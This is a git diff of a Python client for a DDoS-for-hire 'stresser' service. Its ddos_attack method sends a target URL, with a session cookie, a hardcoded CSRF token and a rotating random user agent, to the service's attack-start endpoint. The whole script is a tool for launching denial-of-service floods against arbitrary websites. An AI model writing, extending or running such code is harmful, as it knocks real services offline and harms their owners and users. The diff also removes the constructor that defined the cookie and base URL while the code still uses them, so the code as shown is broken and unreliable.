@@ -1,20 +1,26 @@
 import httpx
 
+from colorama import *
+from helpers.useragent import UserAgent
+
+init(convert=True)
 httpx_client: object = httpx.Client(timeout=None) 
 
-
-class send:
-    def __init__(self, cookie: str) -> None:
-        self.cookie: str = cookie
-        self.base_url = "https://stresser.su"
-        
-    def ddos(self, website: str, method: str) -> bool:
+class Requests:        
+    def ddos_attack(self, website: str, method: str) -> bool:
         try:
             if method.lower() != "https" and method.lower() != "http":
                 return False
             else:
                 website: str = website.replace("https://", "").replace("http://", "")
                 new_url: str = f"{method}://{website}"
+                
+                user_agent: str = UserAgent.random()
+                
+                if user_agent == None:
+                    print(f"{Fore.RED}[USERAGENT]{Fore.RED}{Fore.RESET} Failed to generate a unique UserAgent")
+                else:
+                    print(f"{Fore.GREEN}[USERAGENT]{Fore.GREEN}{Fore.RESET} {user_agent}")
                 
                 headers = {
                     'accept': '*/*',
@@ -30,7 +36,7 @@ class send:
                     'sec-fetch-mode': 'cors',
                     'sec-fetch-site': 'same-origin',
                     'cookie': self.cookie,
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+                    'user-agent': user_agent,
                     'x-csrf-token': '2c54c2a7540b77593e7df717a79b395cdlgut6slb845stsjv9cud4fuje1451refCS2a02c7c5ca780004c2fb342eacc5e3frefCS82ec23e3a9510a780b6b72f9460922f2',
                     'x-requested-with': 'XMLHttpRequest'
                 }
@@ -49,8 +55,13 @@ class send:
                 
                 response = httpx_client.post(f"{self.base_url}/request/hub/start", headers=headers, data=payload)
 
-                print(response.status_code)
-                print(response.content)
+                if response.status_code == 200:
+                    response_content: str = response.content.decode("utf-8")
+                    print(response_content)
+                    return True 
+                else:
+                    return False
             
-        except:
+        except Exception as e:
+            print(e)
             return False
